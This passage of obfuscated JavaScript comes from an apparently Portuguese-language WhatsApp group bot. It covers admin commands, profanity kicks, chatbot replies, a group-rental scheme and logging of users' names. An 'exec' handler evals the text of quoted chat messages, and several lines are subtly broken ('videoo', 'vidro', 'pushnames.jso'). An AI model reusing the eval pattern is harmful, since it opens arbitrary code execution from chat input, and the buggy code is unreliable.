                    try {
                      const {
                        videoo: _0x2f4b36
                      } = await fetchJson(SITE_JEFF_APIS + "/api/instagram?url=" + _0x4276a7 + "&apikey=" + _0x512d5e);
                      if (video) {
                        const _0x3e1d8e = {
                          text: "✅",
                          key: _0x302296.key
                        };
                        const _0x532d63 = {
                          react: _0x3e1d8e
                        };
                        _0x263319.sendMessage(_0x4f1071, _0x532d63);
                        const _0xe7a92d = _0x2f4b36.resultado;
                        const _0x4b217d = {
                          vidro: _0xe7a92d,
                          caption: ""
                        };
                        const _0x157bc9 = {
                          quoted: _0x302296
                        };
                        await _0x263319.sendMessage(_0x4f1071, _0x4b217d, _0x157bc9);
                      } else {
                        _0x403602("Não foi possível obter o vídeo do instagram.");
                      }
                    } catch {
                      _0x403602("Ocorreu um erro ao buscar o vídeo do instagram.");
                    }
                  }
                }
              }
              if (_0x193ccd) {
                if (_0xf87dd3.match) {
                  _0x3d8f9d(_0xf87dd3);
                }
                if (_0xf87dd3.match) {
                  _0x34eb5d(_0xf87dd3);
                }
                if (_0xf87dd3.match) {
                  _0x146833(_0xf87dd3);
                }
                if (_0xf87dd3.match("Xbot") || _0xf87dd3.match("xbot") || _0xf87dd3.match("X-bot") || _0xf87dd3.match("x-bot") || _0xf87dd3.match("bot") || _0xf87dd3.match("Bot")) {
                  if (!_0xd20756) {
                    return _0x403602(_0x270bdf);
                  }
                  try {
                    await new Promise(_0x169715 => setTimeout(_0x169715, 2000));
                    await _0x263319.sendPresenceUpdate("composing", _0x4f1071);
                    datasimi = await fetchJson("https://api.simsimi.vn/v1/simtalk", {
                      method: "POST",
                      headers: {
                        "content-type": "application/x-www-form-urlencoded"
                      },
                      body: "text=" + _0x1d6557 + "&lc=pt"
                    });
                    return _0x403602(datasimi.message);
                  } catch (_0x1f7200) {
                    return _0x403602("Resposta não encontrada..");
                  }
                }
                if (_0x3ad850 === "como faz figurinha?") {
                  blars = ["so enviar uma imagem / gif ou video ate 9 segundos"];
                  blarnd = blars[Math.floor(Math.random() * blars.length)];
                  _0x403602(blarnd);
                }
                if (_0x3ad850 === "como faz figurinhas?") {
                  blars = ["so enviar uma imagem / gif ou video ate 9 segundos"];
                  blarnd = blars[Math.floor(Math.random() * blars.length)];
                  _0x403602(blarnd);
                }
                if (_0x3ad850 === "Pix") {
                  blars = ["🥹QUELUH PIXIZIN jeffersonnarley5555@gmail.com", "PIX: jeffersonnarley5555@gmail.com", "🥹AINN EU LI PIX? MANDA 5CÃO PIX: jeffersonnarley5555@gmail.com", "PIX DO MEU DONO: jeffersonnarley5555@gmail.com", "e o pix nada inda?"];
                  blarnd = blars[Math.floor(Math.random() * blars.length)];
                  _0x403602(blarnd);
                }
                if (_0x3ad850 === "pix") {
                  blars = ["🥹QUELUH PIXIZIN 7w7", "PIX: jeffersonnarley5555@gmail.com", "🥹AINN EU LI PIX? MANDA 5CÃO PIX: jeffersonnarley5555@gmail.com", "PIX DO MEU DONO: jeffersonnarley5555@gmail.com", "e o pix nada inda?"];
                  blarnd = blars[Math.floor(Math.random() * blars.length)];
                  _0x403602(blarnd);
                }
                if (_0x3ad850 === "PIX") {
                  blars = ["🥹QUELUH PIXIZIN", "Me faz um pixizin? 🥹👉👈", "🥹AINN EU LI PIX? MANDA 5CÃO AEE", "Eu li PIX ? eu queruuh ^-^", "e o pix nada inda?"];
                  blarnd = blars[Math.floor(Math.random() * blars.length)];
                  _0x403602(blarnd);
                }
                if (_0x3ad850.includes("bot corno")) {
                  if (_0x302296.key.fromMe) {
                    return;
                  }
                  _0x403602("Corno é você, seu animal");
                }
                if (_0x3ad850.includes("adivinha meu celular") || _0x3ad850.includes("bot qual meu celular")) {
                  const _0x25f6f6 = {
                    text: _0x5e33af
                  };
                  const _0x5bbcd5 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x25f6f6, _0x5bbcd5);
                }
              }
              if (_0x3381b5.includes("exec")) {
                if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                  return;
                }
                try {
                  paramsQuoted = _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.conversation || _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;
                  return eval("" + paramsQuoted);
                  console.log("[EXEC]~> " + paramsQuoted);
                } catch (_0x534c73) {
                  _0x403602(_0x534c73);
                }
              }
              if (_0x4df73d) {
                if (_0xf87dd3 == "Aceitar") {
                  if (!_0x150e9e && !_0x2a5ff3) {
                    return _0x403602(mess.onlyAdmins());
                  }
                  if (!_0x5550bd) {
                    return _0x403602("*Preciso ser administrador para executar essa ação!*");
                  }
                  const _0x23cf5d = (await _0x263319.groupRequestParticipantsList(_0x4f1071)) || [];
                  let _0x55ad04 = _0x23cf5d.length;
                  if (_0x55ad04 === 0) {
                    return _0x403602("*NÃO HÁ SOLICITAÇÕES PENDENTES!*");
                  }
                  for (let _0x18bfd7 of _0x23cf5d) {
                    const _0x439d50 = _0x18bfd7.jid;
                    await _0x263319.groupRequestParticipantsUpdate(_0x4f1071, [_0x439d50], "approve");
                  }
                  _0x403602("*TODAS AS " + _0x55ad04 + " SOLICITAÇÕES FORAM ACEITAS COM SUCESSO!*");
                }
                if (_0xf87dd3 == "Recusar") {
                  if (!_0x150e9e && !_0x2a5ff3) {
                    return _0x403602(mess.onlyAdmins());
                  }
                  if (!_0x5550bd) {
                    return _0x403602("*Preciso ser administrador para executar essa ação!*");
                  }
                  const _0x150c3d = (await _0x263319.groupRequestParticipantsList(_0x4f1071)) || [];
                  let _0x2a8ba8 = _0x150c3d.length;
                  if (_0x2a8ba8 === 0) {
                    return _0x403602("*NÃO HÁ SOLICITAÇÕES PENDENTES!*");
                  }
                  for (let _0x139a8f of _0x150c3d) {
                    const _0x3b5860 = _0x139a8f.jid;
                    await _0x263319.groupRequestParticipantsUpdate(_0x4f1071, [_0x3b5860], "reject");
                  }
                  _0x403602("*TODAS AS " + _0x2a8ba8 + " SOLICITAÇÕES FORAM RECUSADAS!*");
                }
                if (_0xf87dd3 == "Banir") {
                  if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                    return _0x403602("Só ADM pode utilizar este comando.");
                  }
                  if (!_0x5550bd) {
                    return _0x403602("O Bot Precisa ser ADM pra executar essa ação.");
                  }
                  if (!_0x150e9e && !_0x35021e === true) {
                    audiomenu = await fs.readFileSync("./DADOS/audios/ban2.mp3");
                    const _0x2ecb23 = {
                      audio: audiomenu,
                      mimetype: "audio/mp4",
                      ptt: true
                    };
                    const _0x16a963 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x2ecb23, _0x16a963);
                  }
                  try {
                    if (!_0xf87dd3.includes("@")) {
                      if (_0x302296.message.extendedTextMessage == undefined || _0x302296.message.extendedTextMessage == null) {
                        if (!JSON.stringify(_0x5b3ba6).includes(_0x5d6558)) {
                          return _0x403602("Este usuário já foi removido do grupo.");
                        }
                      }
                      if (_0x2dd81a.includes(_0x5d6558)) {
                        return _0x403602("Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você");
                      }
                      if (JSON.stringify(_0x27033e || numerodono_ofc).indexOf(_0x1dcf0a) >= 0) {
                        return _0x403602("Não posso remover meu dono 🤧");
                      }
                      _0x263319.sendMessage(_0x4f1071, {
                        text: "@" + _0x5d6558.split("@")[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -",
                        mentions: [_0x5d6558]
                      });
                      _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x5d6558], "remove");
                    } else {
                      if (_0x1d6557.length > 15) {
                        return _0x403602("Só pode remover uma pessoa por vez..");
                      }
                      if (_0x2dd81a.includes(_0x25b5fb)) {
                        return _0x403602("Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você");
                      }
                      if (_0x27033e.includes(_0x25b5fb)) {
                        return _0x403602("Não posso remover meu dono 🤧");
                      }
                      if (!JSON.stringify(_0x5b3ba6).includes(_0x25b5fb)) {
                        return _0x403602("Este usuário já foi removido do grupo.");
                      }
                      _0x263319.sendMessage(_0x4f1071, {
                        text: "@" + _0x25b5fb.split("@")[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) - ",
                        mentions: [_0x25b5fb]
                      });
                      _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x25b5fb], "remove");
                    }
                  } catch (_0x3e1c20) {
                    console.log(_0x3e1c20);
                  }
                }
                if (_0xf87dd3 == "Abrir") {
                  if (!_0x150e9e && !_0x35021e === true) {
                    const _0x523f3d = {
                      audio: audiomenu,
                      mimetype: "audio/mp4",
                      ptt: true
                    };
                    const _0x5ac26e = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x523f3d, _0x5ac26e);
                  }
                  if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                    return _0x403602("Só ADM pode utilizar este comando.");
                  }
                  if (!_0x5550bd) {
                    return _0x403602("O Bot Precisa ser ADM pra executar essa ação.");
                  }
                  try {
                    await _0x263319.groupSettingUpdate(_0x4f1071, "not_announcement");
                    _0x403602("Grupo aberto com sucesso!");
                  } catch (_0x24d2d3) {
                    console.log(_0x24d2d3);
                  }
                }
                if (_0xf87dd3 == "Fechar") {
                  if (!_0x150e9e && !_0x35021e === true) {
                    const _0x23f117 = {
                      audio: audiomenu,
                      mimetype: "audio/mp4",
                      ptt: true
                    };
                    const _0x5ab23a = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x23f117, _0x5ab23a);
                  }
                  if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                    return _0x403602("Só ADM pode utilizar este comando.");
                  }
                  if (!_0x5550bd) {
                    return _0x403602("O Bot Precisa ser ADM pra executar essa ação.");
                  }
                  try {
                    await _0x263319.groupSettingUpdate(_0x4f1071, "announcement");
                    _0x403602("Grupo fechado com sucesso!");
                  } catch (_0x2af0ad) {
                    console.log(_0x2af0ad);
                  }
                }
                if (_0xf87dd3 == "Apaga" || _0xf87dd3 == "apaga" || _0xf87dd3 == "apagar" || _0xf87dd3 == "Apagar" || _0xf87dd3 == "D" || _0xf87dd3 == "d" || _0xf87dd3 == "a" || _0xf87dd3 == "A") {
                  if (!_0x150e9e && !_0x35021e && !_0x38b1b5) ;
                  if (!_0x5d6558) {
                    _0x263319.sendMessage(_0x4f1071, {
                      delete: {
                        remoteJid: _0x4f1071,
                        fromMe: false,
                        id: _0x302296.message.extendedTextMessage.contextInfo.stanzaId,
                        participant: _0x5d6558
                      }
                    });
                  }
                }
                if (_0xf87dd3 == "Pode banir bot") {
                  if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                    if (!_0x5550bd) {
                      return _0x403602("O Bot Precisa ser ADM pra executar essa ação.");
                    }
                  }
                  if (!_0x150e9e && !_0x35021e === true) {
                    audiomenu = await fs.readFileSync("./DADOS/audios/ban2.mp3");
                    const _0x418385 = {
                      audio: audiomenu,
                      mimetype: "audio/mp4",
                      ptt: true
                    };
                    const _0x5e0689 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x418385, _0x5e0689);
                  }
                  try {
                    if (!_0xf87dd3.includes("@")) {
                      if (_0x302296.message.extendedTextMessage == undefined || _0x302296.message.extendedTextMessage == null) {
                        if (!JSON.stringify(_0x5b3ba6).includes(_0x5d6558)) {
                          return _0x403602("Este usuário já foi removido do grupo.");
                        }
                      }
                      if (_0x2dd81a.includes(_0x5d6558)) {
                        return _0x403602("Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você");
                      }
                      if (JSON.stringify(_0x27033e || numerodono_ofc).indexOf(_0x1dcf0a) >= 0) {
                        return _0x403602("Não posso remover meu dono 🤧");
                      }
                      _0x263319.sendMessage(_0x4f1071, {
                        text: "@" + _0x5d6558.split("@")[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -",
                        mentions: [_0x5d6558]
                      });
                      _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x5d6558], "remove");
                    } else {
                      if (_0x1d6557.length > 15) {
                        return _0x403602("Só pode remover uma pessoa por vez..");
                      }
                      if (_0x2dd81a.includes(_0x25b5fb)) {
                        return _0x403602("Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você");
                      }
                      if (_0x27033e.includes(_0x25b5fb)) {
                        return _0x403602("Não posso remover meu dono 🤧");
                      }
                      if (!JSON.stringify(_0x5b3ba6).includes(_0x25b5fb)) {
                        return _0x403602("Este usuário já foi removido do grupo.");
                      }
                      _0x263319.sendMessage(_0x4f1071, {
                        text: "@" + _0x25b5fb.split("@")[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) - ",
                        mentions: [_0x25b5fb]
                      });
                      _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x25b5fb], "remove");
                    }
                  } catch (_0x4acf83) {
                    console.log(_0x4acf83);
                  }
                }
                if (_0xf87dd3 === "Promover") {
                  if (!_0x150e9e && !_0x35021e) {
                    return _0x403602("Só ADM pode utilizar este comando.");
                  }
                  if (!_0x5550bd) {
                    return _0x403602("O Bot precisa ser ADM para executar essa ação.");
                  }
                  let _0x466f39;
                  if (fs.existsSync("./DADOS/grupos/grupo_" + _0x4f1071 + ".json")) {
                    _0x466f39 = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
                  } else {
                    const _0x540eb7 = {
                      protecaoAtivada: false,
                      donos: []
                    };
                    _0x466f39 = _0x540eb7;
                  }
                  if (!_0xf87dd3.includes("@")) {
                    if (_0x302296.message.extendedTextMessage == undefined || _0x302296.message.extendedTextMessage == null) {
                      return _0x403602("Marque a mensagem do usuário que deseja promover para administrador ou marque com " + _0x1d93be + "promover @marcar-ele");
                    }
                    if (_0x466f39.protecaoAtivada && !_0x466f39.donos.includes(_0x32e455) && _0x150e9e) {
                      await _0x263319.sendMessage(_0x4f1071, {
                        text: "\n⚠️ ALERTA ADMINISTRADORES ⚠️\n\n👤 ADM PROMOVIDO:\n@" + _0x5d6558.split("@")[0] + "\n\n😎 PELO ADM @" + _0x32e455.split("@")[0] + "\n\n🚨 AVISO: Este administrador foi rebaixado automaticamente por tentar promover outro membro sem permissão. Como resultado, ambos foram rebaixados.\n\n👨‍✈️ Admin responsável:\n@" + _0x32e455.split("@")[0] + "\n",
                        mentions: [_0x5d6558, _0x32e455, ..._0x2aa963]
                      });
                      await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "demote");
                    } else {
                      _0x263319.sendMessage(_0x4f1071, {
                        text: "@" + _0x5d6558.split("@")[0] + " Foi Promovido para [ADM] com sucesso.",
                        mentions: [_0x5d6558]
                      });
                      _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x5d6558], "promote");
                    }
                  } else {
                    if (_0x1d6557.length > 15) {
                      return _0x403602("Só pode Promover uma pessoa por vez.");
                    }
                    if (_0x466f39.protecaoAtivada && !_0x466f39.donos.includes(_0x32e455) && _0x150e9e) {
                      await _0x263319.sendMessage(_0x4f1071, {
                        text: "\n⚠️ ALERTA ADMINISTRADORES ⚠️\n\n👤 ADM PROMOVIDO:\n@" + _0x1dcf0a.split("@")[0] + "\n\n😎 PELO ADM @" + _0x32e455.split("@")[0] + "\n\n🚨 AVISO: Este administrador foi rebaixado automaticamente por tentar promover outro membro sem permissão. Como resultado, ambos foram rebaixados.\n\n👨‍✈️ Admin responsável:\n@" + _0x32e455.split("@")[0] + "\n",
                        mentions: [_0x1dcf0a, _0x32e455, ..._0x2aa963]
                      });
                      await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "demote");
                    } else {
                      _0x263319.sendMessage(_0x4f1071, {
                        text: "@" + _0x1dcf0a.split("@")[0] + " Foi promovido(a) para adm com sucesso.",
                        mentions: [_0x1dcf0a]
                      });
                      _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x1dcf0a], "promote");
                    }
                  }
                }
                if (_0xf87dd3 == "Rebaixar") {
                  if (!_0x150e9e && !_0x35021e) {
                    return _0x403602("Só ADM pode utilizar este comando.");
                  }
                  if (!_0x5550bd) {
                    return _0x403602("O Bot Precisa ser ADM pra executar essa ação.");
                  }
                  let _0x51efd4;
                  if (fs.existsSync("./DADOS/grupos/grupo_" + _0x4f1071 + ".json")) {
                    _0x51efd4 = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
                  } else {
                    const _0x2858ef = {
                      protecaoAtivada: false,
                      donos: []
                    };
                    _0x51efd4 = _0x2858ef;
                  }
                  try {
                    if (!_0xf87dd3.includes("@")) {
                      if (_0x302296.message.extendedTextMessage == undefined || _0x302296.message.extendedTextMessage == null) {
                        return _0x403602("Marque a mensagem do usuário que deseja rebaixar para membro comum ou marque com " + _0x1d93be + "rebaixar @marcar-ele");
                      }
                      if (JSON.stringify(_0x27033e || numerodono_ofc).indexOf(_0x1dcf0a) >= 0) {
                        return _0x403602("Não posso rebaixar meu dono 🤧");
                      }
                      if (_0x51efd4.protecaoAtivada && !_0x51efd4.donos.includes(_0x32e455)) {
                        _0x263319.sendMessage(_0x4f1071, {
                          text: "\n⚠️ ALERTA ADMINISTRADORES ⚠️\n\n👤 TENTATIVA DE REMOÇÃO DE CARGO DO(A) ADM::\n@" + _0x5d6558.split("@")[0] + "\n\n😎 PELO ADM @" + _0x32e455.split("@")[0] + "\n\n🚨 AVISO: Este administrador foi rebaixado automaticamente por tentar rebaixar outro membro sem permissão. Como resultado, ambos foram rebaixados.\n\n👨‍✈️ Admin responsável:\n@" + _0x32e455.split("@")[0] + "\n",
                          mentions: [_0x5d6558, _0x32e455, ..._0x2aa963]
                        });
                        await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x5d6558], "demote");
                        await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "demote");
                      } else {
                        _0x263319.sendMessage(_0x4f1071, {
                          text: "@" + _0x5d6558.split("@")[0] + " Foi rebaixado(a) para membro comum com sucesso.",
                          mentions: [_0x5d6558]
                        });
                        _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x5d6558], "demote");
                      }
                    } else {
                      if (_0x1d6557.length > 15) {
                        return _0x403602("Só pode rebaixar uma pessoa por vez.");
                      }
                      if (_0x51efd4.protecaoAtivada && !_0x51efd4.donos.includes(_0x32e455)) {
                        _0x263319.sendMessage(_0x4f1071, {
                          text: "\n⚠️ ALERTA ADMINISTRADORES ⚠️\n\n👤 TENTATIVA DE REMOÇÃO DE CARGO DO(A) ADM::\n@" + _0x25b5fb.split("@")[0] + "\n\n😎 PELO ADM @" + _0x32e455.split("@")[0] + "\n\n🚨 AVISO: Este administrador foi rebaixado automaticamente por tentar rebaixar outro membro sem permissão. Como resultado, ambos foram rebaixados.\n\n👨‍✈️ Admin responsável:\n@" + _0x32e455.split("@")[0] + "\n",
                          mentions: [_0x25b5fb, _0x32e455, ..._0x2aa963]
                        });
                        await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x25b5fb], "demote");
                        await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "demote");
                      } else {
                        _0x263319.sendMessage(_0x4f1071, {
                          text: "@" + _0x25b5fb.split("@")[0] + " Foi rebaixado(a) para membro comum com sucesso.",
                          mentions: [_0x25b5fb]
                        });
                        _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x25b5fb], "demote");
                      }
                    }
                  } catch (_0x379457) {
                    console.log(_0x379457);
                  }
                }
              }
              switch (_0x1c051c) {}
              if (_0xd20756 && _0x3c37ec && _0x5550bd) {
                if (_0x3bd584[0].antipalavrao.palavras.indexOf(_0x2a2fa4) >= 0) {
                  if (!_0x150e9e && !_0x35021e) {
                    const _0x215eec = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      text: "SEM PALAVRÃO!! 😠!!"
                    }, _0x215eec);
                    setTimeout(() => {
                      if (!JSON.stringify(_0x5b3ba6).includes(_0x32e455)) {
                        return;
                      }
                      _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
                    }, 2000);
                    setTimeout(() => {
                      const _0x5c3ddc = {
                        quoted: _0x302296
                      };
                      _0x263319.sendMessage(_0x4f1071, {
                        text: "*「 - REMOVIDO POR UTILIZAR UMA PALAVRA PROIBIDA - 」*\nVocê será banido do gp, Na proxima veja as regras ao digitar qualquer palavra..!!"
                      }, _0x5c3ddc).catch(_0x73e358 => {
                        const _0x19427a = {
                          quoted: _0x302296
                        };
                        _0x263319.sendMessage(_0x4f1071, {
                          text: "InFelizmente, não sou um administrador, entt não posso te banir!!"
                        }, _0x19427a);
                      });
                    }, 200);
                  } else {
                    return _0x403602("VOCÊ PODE " + _0x55a6ac + " 😇");
                  }
                }
              }
              if (_0xd20756 && _0x12f03b && _0xf87dd3 != undefined) {
                if (_0x51a818 == "imageMessage") {
                  return;
                }
                if (_0x51a818 == "audioMessage") {
                  return;
                }
                if (_0x51a818 == "stickerMessage") {
                  return;
                }
                if (_0x302296.key.fromMe) {
                  return;
                }
                console.log(_0xf87dd3);
                await new Promise(_0x266668 => setTimeout(_0x266668, 3000));
                await _0x263319.sendPresenceUpdate("composing", _0x4f1071);
                muehe = await simih(_0xf87dd3);
                console.log(muehe);
                _0x403602(muehe);
              }
              if (_0x452d71 && !_0x52ab25 && _0xd20756) {
                if (_0x51a818 == "conversation" || _0x51a818 == "extendedTextMessage") {
                  if (_0x302296.key.fromMe) {
                    return;
                  }
                  if (_0x51a818 == "extendedTextMessage" && _0x1d93be.includes(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.conversation[0])) {
                    return;
                  }
                  insert(_0x51a818, _0x302296);
                  const _0x51f817 = await respon(_0xf87dd3);
                  const _0x25f0e2 = {
                    quoted: _0x302296
                  };
                  if (_0x51f817) {
                    _0x263319.sendMessage(_0x4f1071, {
                      text: _0x51f817
                    }, _0x25f0e2);
                  }
                }
              }
              hora2 = momento.tz("America/Sao_Paulo").format("HH:mm:ss");
              if (_0x52ab25) {
                _0x31362f(_0x3dec88);
              }
              if (JSON.stringify(_0x4c107d).includes("Jeffinho")) {
                BC = _0x4c107d.map(_0x32d009 => _0x32d009.id).indexOf("Jeffinho");
                if (_0x4c107d[BC].chaves.length > 0) {
                  caixa = [];
                  for (k of _0x4c107d[BC].chaves) {
                    if (_0x3ad850.toUpperCase() === k.key.toUpperCase()) {
                      caixa.push(k.key);
                    }
                  }
                  if (caixa.length > 0 && _0x4c107d[BC].chaves.map(_0x58a6a8 => _0x58a6a8.key).includes(caixa[0])) {
                    AD = _0x4c107d[BC].chaves.map(_0x23cdd7 => _0x23cdd7.key).indexOf(caixa[0]);
                    timeday = _0x4c107d[BC].chaves[AD].dias;
                    pessoa = _0x4c107d[BC].chaves[AD].cliente;
                    infinity = _0x4c107d[BC].chaves[AD].dias > 0 ? false : true;
                    if (!JSON.stringify(_0x565fa1).includes(_0x4f1071)) {
                      const _0x1d291b = {
                        id: _0x4f1071,
                        limite: 5,
                        validado: true
                      };
                      _0x565fa1.push(_0x1d291b);
                      fs.writeFileSync("./DADOS/aluguel/grupos.json", JSON.stringify(_0x565fa1, null, 2));
                    } else {
                      GP = _0x565fa1.map(_0x4f018e => _0x4f018e.id).indexOf(_0x4f1071);
                      _0x565fa1[GP].validado = true;
                      fs.writeFileSync("./DADOS/aluguel/grupos.json", JSON.stringify(_0x565fa1, null, 2));
                    }
                    if (infinity == false) {
                      if (_0x4c107d[BC].chaves[AD].tipo == 1 && _0xd20756) {
                        if (!JSON.stringify(_0x1e3043).includes(_0x4f1071)) {
                          _0x1e3043.push({
                            id: _0x4f1071,
                            nome: _0x471350,
                            tempo: timeday,
                            totalRent: timeday,
                            cliente: pessoa,
                            save: Number(moment.tz("America/Sao_Paulo").format("DD")),
                            cortesia: false
                          });
                          fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                          _0x4c107d[BC].chaves.splice(AD, 1);
                          fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                          _0x403602("*Grupo adicionado ao aluguel com sucesso* ✅");
                        } else {
                          _0x3529b0 = _0x1e3043.map(_0xd9e262 => _0xd9e262.id).indexOf(_0x4f1071);
                          _0x1e3043[_0x3529b0].cortesia = false;
                          _0x1e3043[_0x3529b0].nome = _0x471350;
                          _0x1e3043[_0x3529b0].totalRent = _0x1e3043[_0x3529b0].tempo + timeday;
                          _0x1e3043[_0x3529b0].tempo += timeday;
                          fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                          _0x4c107d[BC].chaves.splice(AD, 1);
                          fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                          _0x403602("+" + timeday + " dia" + (Number(timeday) > 1 ? "s" : "") + " adicionado" + (Number(timeday) > 1 ? "s" : "") + " para este grupo");
                        }
                      }
                    } else if (_0x4c107d[BC].chaves[AD].tipo == 1 && _0xd20756) {
                      _0x4c107d[BC].chaves.splice(AD, 1);
                      fs.writeFileSync("./DADOS/aluguel/moedas.json", JSON.stringify(_0x4c107d, null, 2));
                      _0x403602("Grupo salvo na pasta 📁");
                    }
                  } else {}
                } else {}
              } else {}
              async function _0x3f74fd() {
                if (_0x1e3043.length > 0) {
                  for (x of _0x1e3043) {
                    if (x.save != Number(moment.tz("America/Sao_Paulo").format("DD")) && x.cortesia == false) {
                      if (x.tempo > 1) {
                        jeffinhogstz = _0x1e3043[_0x1e3043.map(_0x231cf8 => _0x231cf8.id).indexOf(x.id)].nome;
                        if (Number(x.tempo) === 8 || Number(x.tempo) === 4 || Number(x.tempo) === 3 || Number(x.tempo) === 2) {
                          _0x56cb1a(x.cliente, "Olá 👋🏽😃\nAcabo de verificar que nosso contrato no grupo " + jeffinhogstz + " termina em " + (Number(x.tempo) === 8 ? "1 semana (7 dias)" : Number(x.tempo) !== 2 ? x.tempo - 1 + " dias" : "24 horas (amanhã)") + "... Não deixe de fechar contrato novamente com nossa equipe 📍\n_(OBS: Qualquer dúvida, contacte meu dono)_");
                        }
                        x.save = Number(moment.tz("America/Sao_Paulo").format("DD"));
                        x.tempo -= 1;
                        fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                      } else {
                        _0x56cb1a(x.id, "⚠️ *TRANSMISSÃO DO " + NickDono + "* ⚠️\n\n```O tempo limite deste grupo acabou. Para renovação de contrato, entre em contato com meu dono:```\nwa.me/" + _0x3a52d1.split("@")[0]);
                        _0x263319.sendMessage(_0x3a52d1, {
                          text: "Só passando pra avisar que o tempo limite do grupo " + x.nome + " expirou agora... Visto que o/a @" + x.cliente.split("@")[0] + " não renovou o contrato, eu saí do grupo dele/a e apaguei os registros 🗑️",
                          mentions: [x.cliente]
                        });
                        GP = _0x565fa1.map(_0x3c34a2 => _0x3c34a2.id).indexOf(x.id);
                        _0x565fa1.splice(GP, 1);
                        fs.writeFileSync("./DADOS/aluguel/grupos.json", JSON.stringify(_0x565fa1, null, 2));
                        RT = _0x1e3043.map(_0x58c1f1 => _0x58c1f1.id).indexOf(x.id);
                        grupoo = x.id;
                        _0x1e3043.splice(RT, 1);
                        fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                        await sleep(4000);
                        _0x263319.groupLeave(grupoo);
                      }
                    }
                  }
                }
              }
              _0x3f74fd();
              async function _0x3d2997() {
                if (_0x1e3043.length > 0) {
                  for (x of _0x1e3043) {
                    if (x.save != Number(moment.tz("America/Sao_Paulo").format("HH")) && x.cortesia == true) {
                      if (x.tempo > 0) {
                        x.save = Number(moment.tz("America/Sao_Paulo").format("HH"));
                        x.tempo -= 1;
                        fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                      } else {
                        _0x56cb1a(x.id, "⚠️ *TRANSMISSÃO DO " + NickDono + "* ⚠️\n\n```O cartão cortesia " + (x.totalRent >= 2000 ? "48H" : "24H") + " deste grupo expirou... Caso se veja interessado em nossos serviços, favor entrar em contato com meu dono:```\nwa.me/" + _0x3a52d1.split("@")[0]);
                        _0x56cb1a(_0x3a52d1, "Só passando pra avisar que o cartão cortesia do grupo " + x.nome + " expirou agora... Visto que não houve alteração em meus registros, eu saí do grupo e apaguei os dados 🗑️");
                        RT = _0x1e3043.map(_0x345278 => _0x345278.id).indexOf(x.id);
                        grupoo = x.id;
                        _0x1e3043.splice(RT, 1);
                        fs.writeFileSync("./DADOS/aluguel/aluguel.json", JSON.stringify(_0x1e3043, null, 2));
                        await sleep(4000);
                        _0x263319.groupLeave(grupoo);
                      }
                    }
                  }
                }
              }
              _0x3d2997();
              if (_0x3ad850 != undefined) {
                if (!JSON.stringify(_0x1af54c).includes(_0x2dd81a)) {
                  const _0x4a114f = {
                    id: _0x2dd81a,
                    nick: NomeDoBot
                  };
                  _0x1af54c.push(_0x4a114f);
                  fs.writeFileSync("./DADOS/usuarios/pushnames.json", JSON.stringify(_0x1af54c, null, 2));
                }
                if (!JSON.stringify(_0x1af54c).includes(_0x32e455)) {
                  const _0x3d8e4b = {
                    id: _0x32e455,
                    nick: _0x55a6ac
                  };
                  _0x1af54c.push(_0x3d8e4b);
                  fs.writeFileSync("./DADOS/usuarios/pushnames.json", JSON.stringify(_0x1af54c, null, 2));
                } else {
                  _0x3529b0 = _0x1af54c.map(_0x4e1853 => _0x4e1853.id).indexOf(_0x32e455);
                  if (_0x3529b0 !== -1) {
                    _0x1af54c[_0x3529b0].nick = _0xd98cb9;
                    fs.writeFileSync("./DADOS/usuarios/pushnames.jso", JSON.stringify(_0x1af54c, null, 2));
                  } else {
